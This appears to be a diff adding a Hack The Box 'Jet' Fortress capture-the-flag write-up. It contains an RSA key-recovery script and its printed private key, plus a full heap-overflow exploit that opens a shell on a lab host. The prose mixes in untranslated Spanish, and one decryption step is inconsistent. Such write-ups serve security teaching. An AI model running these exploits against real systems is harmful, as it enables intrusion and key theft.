@@ -1284,47 +1284,248 @@ python3 exploit.py
 e: 115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139  
 n: 279385031788393610858518717453056412444145495766410875686980235557742299199283546857513839333930590575663488845198789276666170586375899922998595095471683002939080133549133889553219070283957020528434872654142950289279547457733798902426768025806617712953244255251183937835355856887579737717734226688732856105517
 ```
-In this case the key is quite pequeña, we must take into account that the value of nis the result of the multiplication of 2 prime numbers, if we use factordb.com we can factorize n, the 2 numbers that it returns are defined as p and q
+In this case the key is quite pequeña, we must take into account that the value of nis the result of the multiplication of 2 prime numbers, if we use `factordb.com` we can factorize n, the 2 numbers that it returns are defined as p and q
+
+![laatsimage](26.png){: width="1200" height="800" }
+```console
+p = 13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083  
+q = 20196596265430451980613413306694721666228452787816468878984356787652099472230934129158246711299695135541067207646281901620878148034692171475252446937792199
+```
+The value of mis defined as the result of n minus the result of `p + q - 1`
+
+m = n - (p + q - 1)
+
+The variable dis defined as the result of the inverse multiplicative modular function of e y m, so it is also necessary to define the modinv [function in python](https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python)
+```console
+def egcd(a, b):
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)  
+
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        raise
+    else:
+        return x % m
+
+d = modinv(e, m)
+```
+If we get all these values ​​we can construir and show the private key
+
+```console
+key = RSA.construct((n, e, d, p, q))  
+print(key.exportKey().decode())
+```
+
+Our script end would be as follows and when executing it, it builds and shows us the key on the screen privada based on the values ​​obtained.
+
+```console
+#!/usr/bin/python3
+from Crypto.PublicKey import RSA
+
+file = open("public.crt", "r")
+key = RSA.importKey(file.read())
+
+e = key.e
+n = key.n
+
+p = 13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083  
+q = 20196596265430451980613413306694721666228452787816468878984356787652099472230934129158246711299695135541067207646281901620878148034692171475252446937792199  
+
+m = n - (p + q - 1)
+
+def egcd(a, b):
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)
+
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        raise
+    else:
+        return x % m
+
+d = modinv(e, m)
+
+key = RSA.construct((n, e, d, p, q))
+print(key.exportKey().decode())
+```
+```console
+python3 exploit.py
 
 
 
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+-----BEGIN RSA PRIVATE KEY-----
+MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
+gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
+ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
+zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
+EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
+i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
+d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
+A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
+h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
+cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
+fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur  
+bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
+-----END RSA PRIVATE KEY-----
+```
 
-  <style>
-    .note-containers {
-      max-width: 600px;
-      width: 100%;
-      padding: 20px;
-      background-color: #28a745;
-      color: white;
-      border-radius: 15px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      text-align: center;
-      margin: 0 auto; /* Ensures the second container is centered */
-    }
+However, this is optional since we RsaCtfTool obtain the same result in an automated way by passing the public key and a type attack wiener
 
-    .note-containers p {
-      font-size: 1.2rem;
-      line-height: 1.6;
-    }
+```console
+RsaCtfTool --publickey public.crt --private --attack wiener
 
-    .note-containers strong {
-      font-weight: bold;
-      font-size: 1.3rem;
-      color: #ffdd57;
-    }
-  </style>
-</head>
-<body>
-  <div class="note-containers">
-    <p>
-      This writeup will be released <strong>soon!</strong>
-    </p>
-  </div>
-</body>
-</html>
+[*] Testing key public.crt.
+[*] Performing wiener attack on public.crt.
+ 25%|██████████▊                                | 154/612 [36628.83it/s]  
+[*] Attack success with wiener method !
 
+Results for public.crt:
 
+Private key :
+-----BEGIN RSA PRIVATE KEY-----
+MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
+gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
+ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
+zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
+EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
+i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
+d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
+A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
+h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
+cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
+fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur
+bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
+-----END RSA PRIVATE KEY-----
+```
+
+We save the key in a file called private.crty with which openssl we decrypt the file key.bin.enc which is a file that can be used as a password
+```console
+openssl aes-256-cbc -d -in secret.enc -pass file:file
+JET{**************7}
+```
+## Memo
+he last challenge involves the binary memowe found earlier along with the other one, which we can see is the same service that is running on the port 7777
+```console
+$ ./memo
+
+--==[[ Spiritual Memo ]]==--  
+
+[1] Create a memo
+[2] Show memo
+[3] Delete memo
+[4] Tap out
+```
+```console
+netcat 10.13.37.10 7777  
+
+--==[[ Spiritual Memo ]]==--
+
+[1] Create a memo
+[2] Show memo
+[3] Delete memo
+[4] Tap out
+```
+We are again faced with a heap overflow challenge that is ctf again quite long, let’s go straight to the script end of the exploitation.
+
+```console
+#!/usr/bin/python3
+from pwn import remote, p64, u64
+
+shell = remote("10.13.37.10", 7777)
+
+def create_memo(data, answer, more):
+    shell.sendlineafter(b"> ", b"1")
+    shell.sendlineafter(b"Data: ", data)
+    if answer[:3] == "yes":
+        shell.sendafter(b"[yes/no] ", answer.encode())
+    else:
+        shell.sendafter(b"[yes/no] ", answer)
+        shell.sendafter(b"Data: ", more)
+
+def show_memo():
+    shell.sendlineafter(b"> ", b"2")
+    shell.recvuntil(b"Data: ")
+
+def delete_memo():
+    shell.sendlineafter(b"> ", b"3")
+
+def tap_out(answer):
+    shell.sendlineafter(b"> ", b"4")
+    shell.sendafter(b"[yes/no] ", answer)
+
+create_memo(b"A" * 0x1f, b"no", b"A" * 0x1f)
+show_memo()
+shell.recv(0x20)
+
+stack_chunk = u64(shell.recv(6) + b"\x00" * 2) - 0x110
+
+delete_memo()
+create_memo(b"A" * 0x28, b"no", b"A" * 0x28)
+show_memo()
+shell.recvuntil(b"A" * 0x28)
+shell.recv(1)
+
+canary = u64(b"\x00" + shell.recv(7))
+
+create_memo(b"A" * 0x18, b"no", b"A" * 0x18)
+create_memo(b"A" * 0x18, b"no", b"A" * 0x17)
+show_memo()
+shell.recvuntil(b"A" * 0x18)
+shell.recv(1)
+
+heap = u64(b"\x00" + shell.recv(3).ljust(7, b"\x00"))
+
+create_memo(b"A" * 0x18, b"no", b"A" * 0x8 + p64(0x91) + b"A" * 0x8)
+create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
+create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
+create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
+create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8 + p64(0x31))
+create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
+
+tap_out(b"no\x00" + b"A" * 21 + p64(heap + 0xe0))
+delete_memo()
+tap_out(b"no\x00" + b"A" * 21 + p64(heap + 0xc0))
+delete_memo()
+show_memo()
+
+leak = u64(shell.recv(6).ljust(8, b"\x00"))
+libc = leak - 0x3c4b78
+
+create_memo(b"A" * 0x28, b"no", b"A" * 0x10 + p64(0x0) + p64(0x21) + p64(stack_chunk))
+create_memo(p64(leak) * (0x28 // 8), b"no", b"A" * 0x28)
+create_memo(b"A" * 0x8 + p64(0x21) + p64(stack_chunk + 0x18) + b"A" * 0x8 + p64(0x21), "yes", b"")  
+create_memo(b"A" * 0x8, b"no", p64(canary) + b"A" * 0x8 + p64(libc + 0x45216))
+
+tap_out(b"yes\x00")
+
+shell.recvline()
+shell.interactive()
+```
+When we run it we get a shell like memoand in its home we can see the flag
+
+```console
+python3 memo.py
+[+] Opening connection to 10.13.37.10 on port 7777: Done
+[*] Switching to interactive mode
+$ id
+uid=1007(memo) gid=1007(memo) groups=1007(memo)
+$ hostname -I
+10.13.37.10 
+$ cd /home/memo
+$ ls
+flag.txt
+memo
+$ cat flag.txt
+Congrats! JET{7**************7}
+ 
+$
+```
+THIS IS THE COMPLETE WRITE FOR JET [Fortress] HTB I HOPE YOU LIKE IT ! ❤️❤️THANK YOU ❤️❤️
